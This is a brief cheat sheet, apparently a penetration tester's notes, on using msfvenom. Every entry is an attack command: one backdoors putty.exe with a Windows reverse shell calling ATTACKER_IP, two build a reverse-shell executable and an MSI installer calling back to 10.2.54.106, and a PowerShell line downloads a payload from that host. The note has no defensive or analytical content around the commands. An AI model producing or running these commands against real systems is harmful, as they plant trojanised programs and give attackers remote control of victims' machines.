Using MSFVenom

tags: #msfvenom 

Backdoor an existing file like putty.exe
```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

Build an exe service to do a shell_reverse_tcp
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.54.106 LPORT=4450 -f exe -o revshell.exe
```

Build an msi package with msfvenom with a shell_reverse_tcp
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.54.106 LPORT=4445 -f msi -o myinstaller.msi
```

Powershell command to download the exe file to the host
```pwsh
invoke-webrequest -UseBasicParsing -Uri http://10.2.54.106:9000/downloads/rev-svc.exe -OutFile MService.exe
```

